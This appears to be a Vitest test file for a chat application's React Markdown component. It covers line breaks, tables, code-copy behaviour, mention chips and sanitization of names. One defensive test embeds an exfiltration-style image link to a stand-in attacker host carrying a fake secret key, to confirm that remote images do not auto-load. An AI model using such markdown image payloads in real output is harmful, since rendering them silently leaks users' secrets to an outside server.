import { describe, it, expect, vi } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";
import { Markdown, nodeText } from "./Markdown";

describe("Markdown", () => {
  it("keeps single newlines as line breaks", () => {
    const { container } = render(<Markdown content={"line one\nline two\nline three"} />);
    expect(container.querySelectorAll("br")).toHaveLength(2);
    // One paragraph, not three — the breaks are inside it.
    expect(container.querySelectorAll("p")).toHaveLength(1);
  });

  it("still splits blank-line-separated text into paragraphs", () => {
    const { container } = render(<Markdown content={"first para\n\nsecond para"} />);
    expect(container.querySelectorAll("p")).toHaveLength(2);
  });

  it("leaves fenced code untouched", () => {
    const { container } = render(<Markdown content={"```\na\nb\n```"} />);
    expect(container.querySelectorAll("pre code")).toHaveLength(1);
    expect(container.querySelector("pre")?.textContent).toBe("a\nb\n");
    expect(container.querySelectorAll("br")).toHaveLength(0);
  });

  it("renders gfm and links without navigating the webview", () => {
    render(<Markdown content={"- [x] done\n- [ ] todo\n\n[site](https://example.com)"} />);
    const link = screen.getByRole("link", { name: "site" });
    expect(link).toHaveAttribute("href", "https://example.com");
    expect(screen.getAllByRole("checkbox")).toHaveLength(2);
  });

  it("never auto-loads a remote image from message text", () => {
    // Agent or synced text can carry ![](https://attacker/?q=<secret>); loading
    // it on render sends the secret without a click.
    const { container } = render(
      <Markdown content={"see ![chart](https://evil.example/p.png?q=sk-secret)"} />,
    );
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: /chart/ });
    expect(link).toHaveAttribute("href", "https://evil.example/p.png?q=sk-secret");
  });

  it("a malformed image URL in synced text doesn't throw while rendering", () => {
    // A member or agent can post ![](http://[) or ![](https://); new URL() on
    // it throws during render and takes the whole chat view down with it.
    for (const bad of ["![](http://[)", "![](https://)", "![](http://a b)", "![](<http://[::1>)"]) {
      expect(() => render(<Markdown content={bad} />)).not.toThrow();
    }
  });

  it("still renders gfm tables", () => {
    const { container } = render(
      <Markdown content={"| a | b |\n| - | - |\n| 1 | 2 |"} />,
    );
    expect(container.querySelectorAll("table")).toHaveLength(1);
    expect(container.querySelectorAll("thead th")).toHaveLength(2);
    expect(container.querySelectorAll("tbody tr")).toHaveLength(1);
    // Table rows are built from the newlines — they must not become <br>.
    expect(container.querySelectorAll("br")).toHaveLength(0);
  });

  it("hard-breaks a wrapped list item", () => {
    const { container } = render(<Markdown content={"- first\n  continued\n- second"} />);
    expect(container.querySelectorAll("li")).toHaveLength(2);
    // Accepted trade-off, do not "fix": a lazy continuation line inside a list
    // item now breaks instead of reflowing. Hard breaks apply to every author,
    // and preserving runtime line structure is worth this.
    expect(container.querySelectorAll("li")[0].querySelectorAll("br")).toHaveLength(1);
  });

  it("nodeText collects the source text of a node tree (#97)", () => {
    expect(nodeText("abc")).toBe("abc");
    expect(nodeText(["a", "b", 1])).toBe("ab1");
    expect(nodeText(null)).toBe("");
  });

  it("Copy writes the code block's SOURCE to the clipboard (#97)", async () => {
    // The copy path used to read `pre.innerText`, which jsdom returns as undefined —
    // so any clipboard assertion passed vacuously. It now copies the source text.
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    render(<Markdown content={"```ts\nconst a = 1;\nconst b = 2;\n```"} />);
    fireEvent.click(screen.getByRole("button", { name: "Copy code" }));
    expect(writeText).toHaveBeenCalledTimes(1);
    expect(writeText.mock.calls[0][0]).toContain("const a = 1;");
    expect(writeText.mock.calls[0][0]).toContain("const b = 2;");
  });
});

describe("Markdown @you", () => {
  // Ana asked; Ben and Olu are other members. The host sends each viewer the
  // requester's name, and whether the viewer is them.
  const viewers = [
    { who: "Ana", me: true },
    { who: "Ben", me: false },
    { who: "Olu", me: false },
  ];

  it.each(viewers)("shows @you as @Ana for $who, marked as theirs only for Ana", ({ me }) => {
    const { container } = render(<Markdown content={"Done. @you can you confirm?"} youName="Ana" youIsMe={me} />);
    const chip = container.querySelector(".hive-mention");
    expect(chip?.textContent).toBe("@Ana");
    expect(chip?.classList.contains("hive-mention-me")).toBe(me);
    expect(chip?.getAttribute("title")).toBe(me ? "Mentions you" : "Mentions Ana");
    expect(container.textContent).toBe("Done. @Ana can you confirm?");
  });

  it("leaves @you alone without a requester, and in code or addresses", () => {
    const plain = render(<Markdown content={"thanks @you"} />);
    expect(plain.container.querySelector(".hive-mention")).toBeNull();
    expect(plain.container.textContent).toBe("thanks @you");
    const code = render(<Markdown content={"`@you` and me@you.io"} youName="Ana" />);
    expect(code.container.querySelector(".hive-mention")).toBeNull();
    expect(code.container.textContent).toBe("@you and me@you.io");
  });

  it("sanitizes the name it shows", () => {
    const { container } = render(<Markdown content={"@you"} youName={"A‮na"} />);
    expect(container.querySelector(".hive-mention")?.textContent).toBe("@Ana");
  });
});
